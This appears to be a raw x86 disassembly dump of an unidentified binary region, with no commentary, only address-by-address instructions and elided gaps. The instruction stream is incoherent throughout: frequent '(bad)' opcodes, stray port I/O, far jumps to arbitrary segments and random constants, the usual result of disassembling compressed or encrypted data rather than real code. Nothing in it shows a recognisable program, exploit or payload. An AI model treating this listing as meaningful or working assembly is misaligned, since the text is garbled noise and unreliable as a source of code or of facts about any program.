  415644:	fld    DWORD PTR [ecx]
  415646:	xchg   ecx,eax
  415647:	pop    ds
  415648:	and    DWORD PTR [eax-0x44c38cef],0xffffffa9
  41564f:	call   0x5433b0da
  415654:	inc    eax
  415655:	jmp    0x4156aa
  415657:	xor    BYTE PTR [ecx+eiz*8],0x24
  41565b:	leave  
  41565c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41565d:	stos   DWORD PTR es:[edi],eax
  41565e:	jno    0x41567f
  415660:	sub    al,0xa0
  415662:	mov    WORD PTR [esi],gs
  415664:	and    ah,cl
  415666:	xor    DWORD PTR [edx+eax*4],ecx
  415669:	fnstsw WORD PTR [ebx-0x68]
  41566c:	inc    ebx
  41566d:	sbb    DWORD PTR [ebp+0x6c37f745],esp
  415673:	js     0x4156c4
  415675:	fucomip st,st(5)
  415677:	mov    ch,0xb1
  415679:	mov    dl,0xde
  41567b:	ret    0x6203
  41567e:	int    0x65
  415680:	ja     0x415649
  415682:	pop    ecx
  415683:	cmp    edx,ecx
  415685:	push   0xffffffa4
  415687:	fcom   QWORD PTR [edi]
  415689:	and    esp,0x76
  41568c:	push   ebx
  41568d:	sub    al,0x8d
  41568f:	dec    ebp
  415690:	pop    esp
  415691:	or     edi,ebp
  415693:	mov    eax,0x27de4b18
  415698:	out    dx,eax
  415699:	xor    BYTE PTR [eax-0xca498a3],bh
  41569f:	jns    0x4156e1
  4156a1:	shl    BYTE PTR [esi],1
  4156a3:	dec    ebx
  4156a4:	push   es
  4156a5:	jp     0x415710
  4156a7:	jmp    0xc8df:0xfc682b49
  4156ae:	call   0x7bd3:0xa5231cc0
  4156b5:	xor    DWORD PTR [ecx],eax
  4156b7:	(bad)  
  4156b8:	jecxz  0x41570b
  4156ba:	in     al,dx
  4156bb:	mov    dl,BYTE PTR [ebx-0x60]
  4156be:	daa    
  4156bf:	push   edi
  4156c0:	inc    esp
  4156c1:	and    al,BYTE PTR [eax]
  4156c3:	jae    0x4156fd
  4156c5:	stos   BYTE PTR es:[edi],al
  4156c6:	or     cl,BYTE PTR [ebp-0x1b04c0e7]
  4156cc:	je     0x415701
  4156ce:	push   cs
  4156cf:	push   es
  4156d0:	jno    0x4156a5
  4156d2:	jge    0x415673
  4156d4:	jne    0x4156c4
  4156d6:	pop    es
  4156d7:	imul   ecx,DWORD PTR [eax+0x6323820c],0x3f4895c7
  4156e1:	mov    ecx,ecx
  4156e3:	(bad)  
  4156e4:	int3   
  4156e5:	ja     0x4156aa
  4156e7:	push   0x42cb51fe
  4156ec:	xor    al,0x73
	...
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	call   0xbafd:0x67ff45bc
  41575e:	mov    bl,0xba
  415760:	inc    esi
  415761:	sub    al,0x63
  415763:	test   DWORD PTR [ecx],edx
  415765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415766:	addr16 out 0x0,eax
  415769:	add    BYTE PTR [eax],al
  41576b:	add    DWORD PTR [eax],eax
  41576d:	add    BYTE PTR [ecx],dh
  41576f:	shl    esp,0xda
  415772:	dec    ebp
  415773:	es add al,0x1d
  415776:	ror    BYTE PTR [edx-0x1666ed9c],1
  41577c:	add    eax,0x4015762d
  415781:	adc    ebp,DWORD PTR [edi]
  415783:	mov    al,ds:0x3ad4fd62
  415788:	mov    bl,BYTE PTR [eax]
  41578a:	(bad)  
  41578b:	jle    0x4157fe
  41578d:	mov    bh,0x4d
  41578f:	js     0x4157f8
  415791:	addr16 aad 0xcd
  415794:	jne    0x415747
  415796:	and    al,0xaf
  415798:	loop   0x415780
  41579a:	dec    edx
  41579b:	mov    ecx,0x80035291
  4157a0:	inc    ebx
  4157a1:	aam    0x4c
  4157a3:	inc    esp
  4157a4:	dec    ebp
  4157a5:	in     eax,dx
  4157a6:	pop    edx
  4157a7:	dec    esp
  4157a8:	pop    edi
  4157a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157aa:	cld    
  4157ab:	pop    edi
  4157ac:	cmc    
  4157ad:	clc    
  4157ae:	sbb    bh,cl
  4157b0:	and    BYTE PTR [edx-0x2a],0xd3
  4157b4:	add    eax,ecx
  4157b6:	cmp    esp,0x1ef34809
  4157bc:	aad    0x7f
  4157be:	gs enter 0xb173,0x3b
  4157c3:	push   ecx
  4157c4:	sub    ebx,DWORD PTR [esp+eiz*4+0x492562f6]
  4157cb:	jle    0x4157aa
  4157cd:	dec    ebx
  4157ce:	retf   0xb13a
  4157d1:	loope  0x4157c9
  4157d3:	inc    esi
  4157d4:	mov    edi,0x930fbc72
  4157d9:	rcr    DWORD PTR [esi+0x1e4a6f2b],cl
  4157df:	das    
  4157e0:	dec    esi
  4157e1:	mov    eax,0x163168cf
  4157e6:	stos   DWORD PTR es:[edi],eax
  4157e7:	imul   edi,DWORD PTR [ebp+0x2e],0x38
  4157eb:	sub    edx,edi
  4157ed:	xor    eax,0xfe96cccf
  4157f2:	pushf  
  4157f3:	dec    edi
  4157f4:	xchg   esp,eax
  4157f5:	fst    DWORD PTR ds:0xf352033b
  4157fb:	cmp    eax,0xcfb1a128
  415800:	xchg   DWORD PTR [ebx+0x27],ebp
  415803:	xchg   ecx,eax
  415804:	mov    WORD PTR [esi-0x57],es
  415807:	mov    eax,0x4f1fc48d
  41580c:	and    al,0x9c
  41580f:	popf   
  415810:	(bad)  
  415811:	out    dx,al
  415812:	mov    dh,0xbf
  415814:	cmp    al,BYTE PTR [edx+0x1dd70df2]
  41581a:	push   ebp
  41581b:	fadd   st,st(3)
  41581d:	push   es
  41581e:	dec    esp
  41581f:	xchg   ebx,eax
  415820:	int    0x8e
  415822:	loopne 0x4157ed
  415824:	inc    ecx
  415825:	fist   WORD PTR ds:0x9208ec01
  41582b:	xor    eax,0xc245088e
  415830:	int    0xc5
  415832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415833:	or     DWORD PTR [ecx+0x22],esi
  415836:	fs dec eax
  415838:	into   
  415839:	mov    bh,0x82
  41583b:	(bad)  
  41583c:	mov    esp,0x81bbf8ee
  415841:	cmp    ecx,ecx
  415843:	(bad)  
  415844:	lods   eax,DWORD PTR ds:[esi]
  415845:	aam    0xf3
  415847:	aas    
  415848:	fistp  DWORD PTR [eax-0x5e]
  41584b:	jmp    0x8d6da601
  415850:	ret    0x3f84
  415853:	retf   
  415854:	mov    dh,BYTE PTR [ebx+eax*1+0x56]
  415858:	xor    bl,BYTE PTR [ecx]
  41585a:	(bad)  
  41585b:	gs push ds
  41585d:	cmp    BYTE PTR [edi],dh
  41585f:	rcl    al,1
  415861:	aam    0xec
  415863:	xchg   edi,eax
  415864:	popa   
  415865:	inc    eax
  415866:	sti    
  415867:	push   ebx
  415868:	push   0x1a
  41586a:	test   al,0x31
  41586c:	test   eax,0x4e
	...
  4158d5:	add    bl,cl
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	sar    DWORD PTR [edx],cl
  4158e3:	push   eax
  4158e4:	cli    
  4158e5:	and    DWORD PTR [edi-0x18],0x1000000
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	stos   BYTE PTR es:[edi],al
  4158ef:	gs cmp al,0xc
  4158f2:	out    dx,eax
  4158f3:	rcr    ah,1
  4158f5:	push   es
  4158f6:	jmp    0x19f12a92
  4158fb:	scas   al,BYTE PTR es:[edi]
  4158fc:	jmp    0x41592e
  4158fe:	xor    eax,0x87b88352
  415903:	(bad)  
  415904:	mov    bh,0xa9
  415906:	(bad)  
  415907:	and    ebx,DWORD PTR [ebx]
  415909:	jp     0x415928
  41590b:	mov    ecx,0x31c83e9d
  415910:	nop
  415911:	push   es
  415912:	xor    ebp,DWORD PTR [edx+0x69958017]
  415918:	or     eax,DWORD PTR [ebx]
  41591a:	mov    ecx,0x91189e37
  41591f:	xchg   ecx,esp
  415921:	jo     0x4158b1
  415923:	mov    al,ds:0x23f25abc
  415928:	shr    DWORD PTR [esi+0x1],0x3
  41592c:	arpl   bp,si
  41592e:	jno    0x4159a7
  415930:	pop    ss
  415931:	jae    0x4158f6
  415933:	mov    ch,0x91
  415935:	cdq    
  415936:	mov    al,0x71
  415938:	and    DWORD PTR [ebp-0x4cb740b7],edx
  41593e:	sbb    cl,bh
  415940:	xor    DWORD PTR [ecx+eiz*8+0x36],ebx
  415944:	in     al,dx
  415945:	mov    edi,DWORD PTR [edi]
  415947:	push   esp
  415948:	and    eax,0x72688381
  41594d:	or     ch,BYTE PTR [edx]
  41594f:	outs   dx,BYTE PTR ds:[esi]
  415950:	cmp    DWORD PTR [eax],esp
  415952:	(bad)  
  415953:	call   0xd5048729
  415958:	dec    edx
  415959:	test   DWORD PTR [edi],0x25c0cd7
  41595f:	sbb    DWORD PTR [ecx+0x6b64d697],edx
  415965:	inc    eax
  415966:	dec    esp
  415967:	arpl   ax,cx
  415969:	xchg   ecx,eax
  41596a:	je     0x415922
  41596c:	loopne 0x415930
  41596e:	imul   eax,DWORD PTR [esi+0x33],0x2dea792a
  415975:	test   al,0xd0
  415977:	pop    esp
  415978:	sbb    BYTE PTR [esi+0x69],cl
  41597b:	or     DWORD PTR [ecx],ebp
  41597d:	aaa    
  41597e:	div    BYTE PTR [edi-0x11]
  415981:	mov    eax,ds:0xdffef962
  415986:	fadd   DWORD PTR [ebp+0x12]
  415989:	mov    ebx,0x6bd881d
  41598e:	cld    
  41598f:	jl     0x415992
  415991:	xchg   ecx,eax
  415992:	aaa    
  415993:	pusha  
  415994:	xchg   edi,eax
  415995:	xchg   edx,eax
  415996:	push   ss
  415997:	xor    al,0x49
  415999:	outs   dx,DWORD PTR ds:[esi]
  41599a:	dec    edi
  41599b:	push   edi
  41599c:	jmp    0xac3f013f
  4159a1:	jo     0x415980
  4159a3:	test   al,0xe5
  4159a5:	call   0x798088f
  4159aa:	leave  
  4159ab:	push   esp
  4159ac:	mov    ds:0x12a4ffff,al
  4159b1:	jne    0x41594a
  4159b3:	xor    al,0x3a
  4159b5:	push   esp
  4159b6:	pusha  
  4159b7:	sbb    BYTE PTR [ecx+0x215cfae8],bl
  4159bd:	jl     0x4159e7
  4159bf:	rol    dl,cl
  4159c1:	data16 je 0x415a19
  4159c4:	cmp    eax,0x2f04b9e7
  4159c9:	mov    ch,0x53
  4159cb:	cmp    al,0x79
  4159cd:	adc    al,al
  4159cf:	mov    ecx,0x59a483df
  4159d4:	fidivr DWORD PTR [ebp+0xf]
  4159d7:	(bad)  
  4159d8:	xchg   edi,eax
  4159d9:	(bad)  
  4159db:	stc    
  4159dc:	xor    eax,0xf21400f
  4159e1:	adc    dl,al
  4159e3:	fwait
  4159e4:	(bad)  
  4159e5:	icebp  
  4159e6:	test   eax,0xd6d860dc
  4159eb:	cdq    
  4159ec:	inc    edx
  4159ed:	mov    dh,0x0
	...
  415a53:	add    BYTE PTR [eax],al
  415a55:	add    BYTE PTR [ebp-0x78],al
  415a58:	sub    al,0x77
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	test   BYTE PTR [eax+0x12],al
  415a65:	in     al,dx
  415a66:	addr16 jmp 0x1415a6c
  415a6c:	add    BYTE PTR [eax],al
  415a6e:	xor    ah,dh
  415a70:	and    bl,cl
  415a72:	mov    ebp,0x8df7b811
  415a78:	add    BYTE PTR [edx-0x55eff0df],bl
  415a7e:	push   ds
  415a7f:	ret    0xbc86
  415a82:	fsubp  st(7),st
  415a84:	(bad)  
  415a85:	mov    DWORD PTR [ebp-0x18],ebp
  415a88:	add    al,0x7d
  415a8a:	aas    
  415a8b:	add    eax,0x5158da40
  415a90:	jmp    0xfed3:0x77567a77
  415a97:	push   es
  415a98:	call   0x2c330f15
  415a9d:	push   eax
  415a9e:	out    dx,al
  415a9f:	rcl    DWORD PTR [ecx],cl
  415aa1:	(bad)  
  415aa2:	lds    edi,FWORD PTR [eax+0x7116669d]
  415aa8:	adc    BYTE PTR [edx+0x75],ch
  415aab:	retf   0xe858
  415aae:	fisub  DWORD PTR [ecx]
  415ab0:	(bad)  
  415ab1:	out    dx,eax
  415ab2:	push   edx
  415ab3:	data16 fnstcw WORD PTR [ecx-0x202befd3]
  415aba:	inc    ebp
  415abb:	pop    ecx
  415abc:	ss addr16 jl 0x415ab3
  415ac0:	sub    BYTE PTR [edx],bh
  415ac2:	sub    DWORD PTR [edi],eax
  415ac4:	in     al,0xcc
  415ac6:	inc    edi
  415ac7:	stc    
  415ac8:	pop    esp
  415ac9:	lea    esi,[eax]
  415acb:	cli    
  415acc:	pop    edx
  415acd:	push   esp
  415ace:	push   ebp
  415acf:	out    dx,eax
  415ad0:	cwde   
  415ad1:	stos   DWORD PTR es:[edi],eax
  415ad2:	pop    ebx
  415ad3:	aas    
  415ad4:	pusha  
  415ad5:	inc    edx
  415ad6:	ds jne 0x415b44
  415ad9:	jge    0x415b2d
  415adb:	mov    bh,BYTE PTR [edx-0x1a]
  415ade:	jo     0x415aac
  415ae0:	xor    DWORD PTR [edi+ebp*4],ebp
  415ae3:	out    dx,eax
  415ae4:	js     0x415a8f
  415ae6:	xchg   edi,eax
  415ae7:	mov    DWORD PTR [ecx+0x62278411],edx
  415aed:	xchg   edx,eax
  415aee:	inc    esi
  415aef:	add    edx,DWORD PTR [edi-0x730fcc8d]
  415af5:	push   0xffffffbe
  415af7:	inc    ebx
  415af8:	cwde   
  415af9:	cld    
  415afa:	aaa    
  415afb:	jmp    0xd82a:0x168e9ee9
  415b02:	add    al,0xe1
  415b04:	int3   
  415b05:	pop    ds
  415b06:	mov    fs,WORD PTR [ebx]
  415b08:	adc    eax,0x722a4f07
  415b0d:	icebp  
  415b0e:	inc    ch
  415b10:	lods   eax,DWORD PTR ds:[esi]
  415b11:	push   eax
  415b12:	cdq    
  415b13:	rcr    bl,0x4a
  415b16:	fcom   QWORD PTR [edi]
  415b18:	ja     0x415b21
  415b1a:	mov    eax,ds:0x77f0e48d
  415b1f:	clc    
  415b20:	cmp    al,0xdc
  415b22:	daa    
  415b23:	xchg   ebp,eax
  415b24:	div    esi
  415b26:	mov    bl,0xb4
  415b28:	pop    es
  415b29:	retf   
  415b2a:	rol    edi,1
  415b2c:	add    dl,0xb1
  415b2f:	lea    edi,[esi]
  415b31:	or     eax,0xa340dffa
  415b36:	add    eax,0xe9d12e6
  415b3b:	sahf   
  415b3c:	sub    BYTE PTR [edi+0x13856e48],ch
  415b42:	mov    cl,0x9b
  415b44:	add    edi,DWORD PTR [esi]
  415b46:	loop   0x415b71
  415b48:	js     0x415bb9
  415b4a:	cmc    
  415b4b:	icebp  
  415b4c:	cmc    
  415b4d:	aas    
  415b4e:	xchg   esi,eax
  415b4f:	aad    0x2f
  415b51:	sub    DWORD PTR fs:[edx-0x1d359c3f],edi
  415b58:	jmp    0x415adb
  415b5a:	push   ss
  415b5b:	mov    esi,0x7b87e25b
  415b60:	jno    0x415bba
  415b62:	dec    edx
  415b63:	in     eax,0xc3
  415b65:	addr16 mov ds:0xa1ca,eax
  415b69:	jge    0x415b34
  415b6b:	xchg   ebx,eax
  415b6c:	out    dx,al
  415b6d:	aad    0x0
	...
  415bd3:	add    BYTE PTR [eax],al
  415bd5:	add    bh,bl
  415bd7:	mov    esi,0xbb659205
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fdiv   QWORD PTR [edx-0x3b]
  415be4:	jmp    0x12bc3ab
  415be9:	add    BYTE PTR [eax],al
  415beb:	add    DWORD PTR [eax],eax
  415bed:	add    BYTE PTR [ecx+eiz*8-0x776e44ae],dh
  415bf4:	retf   0xb24c
  415bf7:	outs   dx,DWORD PTR ds:[esi]
  415bf8:	test   DWORD PTR [eax+0x7c],ebx
  415bfb:	inc    ebx
  415bfc:	cwde   
  415bfd:	addr16 jmp 0x4c1a5e6
  415c03:	outs   dx,BYTE PTR ds:[esi]
  415c04:	inc    esp
  415c05:	or     al,0xd6
  415c07:	(bad)  
  415c08:	and    edx,DWORD PTR ds:0x9977b8e3
  415c0e:	mov    WORD PTR [edi+0xe3257c1],?
  415c14:	or     BYTE PTR [eax],bl
  415c16:	ret    0x382e
  415c19:	es cmp bl,cl
  415c1c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  415c1e:	aad    0xfe
  415c20:	mov    esi,0x5a62dc14
  415c25:	retf   
  415c26:	jl     0x415c93
  415c28:	push   cs
  415c29:	mov    bh,0xc
  415c2b:	popa   
  415c2c:	(bad)  [esp+esi*4-0x3e]
  415c30:	mov    al,0x61
  415c32:	in     eax,dx
  415c33:	js     0x415c70
  415c35:	popa   
  415c36:	arpl   WORD PTR [ecx],si
  415c38:	xor    DWORD PTR [edx],edx
  415c3a:	jno    0x415cb3
  415c3c:	or     BYTE PTR [eax-0x1e],cl
  415c3f:	js     0x415c17
  415c41:	je     0x19e2b81d
  415c47:	xchg   ebx,eax
  415c48:	push   edx
  415c49:	out    dx,al
  415c4a:	mov    eax,0xc974a516
  415c4f:	or     al,0xcf
  415c51:	push   eax
  415c52:	jbe    0x415ca0
  415c54:	fs leave 
  415c56:	adc    eax,0x6b8e5116
  415c5b:	sub    ecx,DWORD PTR [eax-0x13bfcfb8]
  415c61:	cmp    eax,0x2bee78be
  415c66:	and    cl,BYTE PTR [esi+0x37]
  415c69:	ffree  st(4)
  415c6b:	repz neg BYTE PTR [esi-0x5b]
  415c6f:	jecxz  0x415bf1
  415c71:	jnp    0x415c28
  415c73:	fst    DWORD PTR [ebp-0x74c94f10]
  415c79:	mov    edx,0xe2183bb0
  415c7e:	jp     0x415cb7
  415c80:	cld    
  415c81:	(bad)  
  415c82:	sahf   
  415c83:	sti    
  415c84:	inc    eax
  415c85:	sbb    al,0x91
  415c87:	xor    dh,ah
  415c89:	loope  0x415cc0
  415c8b:	xchg   DWORD PTR [eax+0x75],edi
  415c8e:	call   0x8f8f:0x5a3c3bdd
  415c95:	jp     0x415cf6
  415c97:	mov    ah,0x24
  415c99:	jns    0x415c3a
  415c9b:	scas   eax,DWORD PTR es:[edi]
  415c9c:	ret    0xc57f
  415c9f:	adc    eax,0xcb4b0299
  415ca4:	rol    BYTE PTR [ecx+0x38],cl
  415ca7:	neg    ebx
  415ca9:	test   eax,ecx
  415cab:	stc    
  415cac:	clc    
  415cad:	mov    edx,0xdb780578
  415cb2:	pop    ds
  415cb3:	mov    al,cl
  415cb5:	mov    dh,0xe6
  415cb7:	inc    eax
  415cb8:	mov    ch,0x9c
  415cba:	fisub  DWORD PTR [edi]
  415cbc:	pusha  
  415cbd:	fbld   TBYTE PTR [ebp+esi*8-0x3e]
  415cc1:	mov    esp,0xd3b5b6c8
  415cc6:	sbb    DWORD PTR [esi],0x9b08a6de
  415ccc:	ror    bl,0x6e
  415ccf:	inc    esp
  415cd0:	push   0x29
  415cd2:	mov    eax,0xe1579181
  415cd7:	cli    
  415cd8:	stc    
  415cd9:	repnz sar DWORD PTR [eax+0x20f0c538],1
  415ce0:	mov    ah,0xcb
  415ce2:	in     eax,0x5c
  415ce4:	push   eax
  415ce5:	and    ch,BYTE PTR [ebx-0x63e9b7e3]
  415ceb:	and    edx,eax
  415ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  415d56:	cmp    dl,BYTE PTR [eax]
  415d58:	mov    edi,0xbbbfbf3c
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x552e191f
  415d65:	jae    0x415dce
  415d67:	jmp    0x415d69
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    DWORD PTR [eax],eax
  415d6d:	add    BYTE PTR [ebx],ah
  415d6f:	loop   0x415d24
  415d71:	mov    ch,0x90
  415d73:	or     cl,ch
  415d75:	into   
  415d76:	inc    ebx
  415d77:	add    DWORD PTR [ecx+0x66575f3],ecx
  415d7d:	sbb    bl,BYTE PTR [ebp-0x1a892f5b]
  415d83:	stos   BYTE PTR es:[edi],al
  415d84:	enter  0x22c6,0x41
  415d88:	data16 das 
  415d8a:	std    
  415d8b:	xchg   ebx,eax
  415d8c:	(bad)  
  415d8d:	pop    eax
  415d8e:	jns    0x415d58
  415d90:	frstor [edi+edi*4-0xb]
  415d94:	inc    ecx
  415d95:	push   0xe
  415d97:	mov    ecx,0xd593757
  415d9c:	into   
  415d9d:	iret   
  415d9e:	out    dx,eax
  415d9f:	repnz push eax
  415da1:	fiadd  WORD PTR [edx]
  415da3:	sti    
  415da4:	xor    eax,0x759276c2
  415da9:	mov    ds:0x26d51c8b,eax
  415dae:	inc    ecx
  415daf:	or     dl,BYTE PTR [ebp+0x1732cd80]
  415db5:	test   al,0x59
  415db7:	ins    DWORD PTR es:[edi],dx
  415db8:	push   0x74
  415dba:	mov    ds:0x9e9749fd,al
  415dbf:	add    esp,DWORD PTR [edi]
  415dc1:	dec    eax
  415dc2:	add    edi,ebx
  415dc4:	cmp    al,0x38
  415dc6:	push   eax
  415dc7:	mov    al,ds:0x5d1a2746
  415dcc:	mov    ah,0xd5
  415dce:	jecxz  0x415d55
  415dd0:	sbb    edi,edx
  415dd2:	lods   al,BYTE PTR ds:[esi]
  415dd3:	(bad)
  415dd7:	fs retf 
  415dd9:	ins    BYTE PTR es:[edi],dx
  415dda:	in     eax,0x19
  415ddc:	fidiv  DWORD PTR [esi]
  415dde:	stc    
  415ddf:	cmovg  esi,DWORD PTR [ebp-0x4e]
  415de3:	mov    edx,0xb6efaf5f
  415de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415de9:	leave  
  415dea:	in     eax,dx
  415deb:	imul   ebp,DWORD PTR [eax+0x40],0x39
  415def:	push   ecx
  415df0:	cmc    
  415df1:	or     eax,0x8f177301
  415df6:	cmp    eax,0xa80c0d3a
  415dfb:	(bad)  
  415dfd:	dec    ecx
  415dfe:	xchg   esi,eax
  415dff:	std    
  415e00:	je     0x415e31
  415e02:	mov    ds:0xac0796c,eax
  415e07:	and    DWORD PTR [eax],ebx
  415e09:	out    dx,al
  415e0a:	xor    al,BYTE PTR [ebp+edi*4+0x7d2150fe]
  415e11:	mov    al,0xa4
  415e13:	test   DWORD PTR ds:0x5f9aabaf,eax
  415e19:	retf   
  415e1a:	jbe    0x415da7
  415e1c:	mov    ds:0x94375ed,eax
  415e21:	(bad)  
  415e23:	adc    BYTE PTR [esi-0x52f9d932],ch
  415e29:	iret   
  415e2a:	loope  0x415e18
  415e2c:	imul   edi,DWORD PTR [edx],0xffffffb7
  415e2f:	xor    BYTE PTR [edi+0x409b9b24],al
  415e35:	sbb    eax,0x5b70e92a
  415e3a:	push   ds
  415e3b:	rcl    BYTE PTR [esi],1
  415e3d:	jnp    0x415e24
  415e3f:	xchg   edi,eax
  415e40:	dec    esi
  415e41:	fsubrp st(2),st
  415e43:	adc    al,0xad
  415e45:	outs   dx,BYTE PTR ds:[esi]
  415e46:	push   eax
  415e47:	les    esi,FWORD PTR [ebx]
  415e49:	aas    
  415e4a:	call   0x32060452
  415e4f:	jmp    0x2aaaa891
  415e54:	out    0x4e,al
  415e56:	lods   eax,DWORD PTR ds:[esi]
  415e57:	mov    esi,0x185b34b
  415e5c:	fadd   QWORD PTR [edi]
  415e5e:	push   ebx
  415e5f:	push   ebp
  415e60:	je     0x415e71
  415e62:	ja     0x415e07
  415e64:	in     al,dx
  415e65:	cli    
  415e66:	ss jae 0x415ed6
  415e69:	jbe    0x415e74
  415e6b:	xchg   esp,eax
  415e6c:	xor    eax,0x12
	...
  415ed5:	add    dh,ch
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax-0x8]
  415ee3:	mov    DWORD PTR ds:0xec6798,esp
  415ee9:	add    BYTE PTR [eax],al
  415eeb:	add    DWORD PTR [eax],eax
  415eed:	add    BYTE PTR [ebp+0x1a39add5],bh
  415ef3:	jo     0x415f62
  415ef5:	test   DWORD PTR [esi+0x68],edi
  415ef8:	mov    ebx,0x57989b84
  415efd:	and    BYTE PTR [ebx-0x376f3c09],bl
  415f03:	in     eax,dx
  415f04:	sub    al,BYTE PTR [edi]
  415f06:	ins    DWORD PTR es:[edi],dx
  415f07:	ins    BYTE PTR es:[edi],dx
  415f08:	mov    dh,0x6f
  415f0a:	push   edx
  415f0b:	je     0x415f2d
  415f0d:	xchg   ebp,eax
  415f0e:	sub    cl,dl
  415f10:	inc    edx
  415f11:	add    eax,0x17685e15
  415f16:	jge    0x415f69
  415f18:	std    
  415f19:	into   
  415f1a:	dec    edx
  415f1b:	or     eax,0xd4d79d00
  415f20:	ins    BYTE PTR es:[edi],dx
  415f21:	fdiv   st,st(1)
  415f23:	pop    eax
  415f24:	hlt    
  415f25:	sti    
  415f26:	inc    ebx
  415f27:	add    bh,bh
  415f29:	pop    ecx
  415f2a:	fld    DWORD PTR [edi-0x1f]
  415f2d:	into   
  415f2e:	mov    ebp,0x615a72c9
  415f33:	fsub   DWORD PTR cs:[bx+di-0x950]
  415f39:	stos   DWORD PTR es:[edi],eax
  415f3a:	mov    dl,0x94
  415f3c:	mov    ebp,0xc9685649
  415f41:	pop    ss
  415f42:	sub    eax,0xbd73b3a5
  415f47:	or     DWORD PTR [esi-0x547c451],0x17
  415f4e:	xchg   esp,eax
  415f4f:	jmp    0x2348:0xbfc9ea4c
  415f56:	(bad)  
  415f57:	sbb    eax,0x2fa55bab
  415f5c:	sub    eax,0x25
  415f5f:	jle    0x415f78
  415f61:	das    
  415f62:	push   ecx
  415f63:	push   ebp
  415f64:	repnz sti 
  415f66:	mov    ds:0x9b1a854a,eax
  415f6b:	hlt    
  415f6c:	rol    BYTE PTR [ebx],1
  415f6e:	maskmovq mm7,mm7
  415f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f72:	daa    
  415f73:	ins    BYTE PTR es:[edi],dx
  415f74:	xchg   esp,eax
  415f75:	cld    
  415f76:	(bad)  
  415f77:	ds js  0x415f74
  415f7a:	sbb    BYTE PTR [ecx],ch
  415f7c:	(bad)  
  415f7d:	xchg   esp,eax
  415f7e:	add    ebp,ebx
  415f80:	mov    ds:0x25ada35,eax
  415f85:	ss sub al,dh
  415f88:	aas    
  415f89:	sbb    eax,0x4450dc1a
  415f8e:	sbb    ch,BYTE PTR [eax+0x2f84baf6]
  415f94:	mul    DWORD PTR ds:0xd255053a
  415f9a:	imul   esp,ebp,0x6f23b79
  415fa0:	arpl   WORD PTR [edi+0x3cb34d49],ax
  415fa6:	fild   QWORD PTR [edi-0x4585980f]
  415fac:	retf   
  415fad:	jmp    0xf05d3b64
  415fb2:	stc    
  415fb3:	out    dx,eax
  415fb4:	mov    ds:0x9e635ce9,al
  415fb9:	mov    es,ebx
  415fbb:	in     eax,dx
  415fbc:	daa    
  415fbd:	sbb    ebp,ebp
  415fbf:	mov    esi,0x8941f714
  415fc4:	cs sbb eax,0xdf70ddd5
  415fca:	dec    eax
  415fcb:	mov    ecx,0xf61f00d6
  415fd0:	pop    ebx
  415fd1:	mov    eax,0x2c996308
  415fd6:	out    0x9b,eax
  415fd8:	mov    bl,0x19
  415fda:	or     eax,ebx
  415fdc:	(bad)  
  415fde:	sbb    al,0x90
  415fe0:	jp     0x415f71
  415fe2:	cs cmp eax,0x81981af4
  415fe8:	or     DWORD PTR [esi-0x62],esp
  415feb:	mov    ebx,0x249e
	...
  416054:	add    BYTE PTR [eax],al
  416056:	pop    ss
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	jne    0x4160c8
  416064:	inc    esp
  416065:	add    esp,DWORD PTR [edi-0x13]
  416068:	add    BYTE PTR [eax],al
  41606a:	add    BYTE PTR [ecx],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	das    
  41606f:	ret    0x4a14
  416072:	cmc    
  416073:	shr    BYTE PTR [ecx+ecx*1-0x4bd5070c],cl
  41607a:	pop    ebx
  41607b:	popa   
  41607c:	fwait
  41607d:	and    ah,BYTE PTR [edx+0x4d]
  416080:	leave  
  416081:	sbb    al,BYTE PTR [ecx-0xe]
  416084:	sub    DWORD PTR ds:0x4beb2821,ecx
  41608a:	push   ds
  41608b:	jmp    0x99cac838
  416090:	xchg   esp,eax
  416091:	fld    TBYTE PTR [eax+0x25f11ab2]
  416097:	call   0xb4bca31b
  41609c:	pop    ds
  41609d:	adc    bl,dh
  41609f:	and    al,0x4e
  4160a1:	(bad)  
  4160a3:	cwde   
  4160a4:	imul   esi,eax,0x1179fb18
  4160aa:	sub    DWORD PTR [eax-0x22],edi
  4160ad:	add    al,0x86
  4160af:	sbb    DWORD PTR [edi-0x3798a88d],esi
  4160b5:	mov    BYTE PTR [eax+esi*8-0x365adc8d],al
  4160bc:	stc    
  4160bd:	int3   
  4160be:	add    ecx,eax
  4160c0:	leave  
  4160c1:	jnp    0x416110
  4160c3:	mov    eax,0x816e2ff3
  4160c8:	dec    ebp
  4160c9:	dec    ebp
  4160ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160cb:	pop    ds
  4160cc:	xchg   ecx,eax
  4160cd:	cmp    al,0xfa
  4160cf:	xlat   BYTE PTR ds:[ebx]
  4160d0:	mov    bh,0x84
  4160d2:	das    
  4160d3:	ret    0x1229
  4160d6:	sbb    bh,BYTE PTR [ebp+0x7eaab8cb]
  4160dc:	mov    edi,0x49fb4a9c
  4160e1:	mov    ah,0x7e
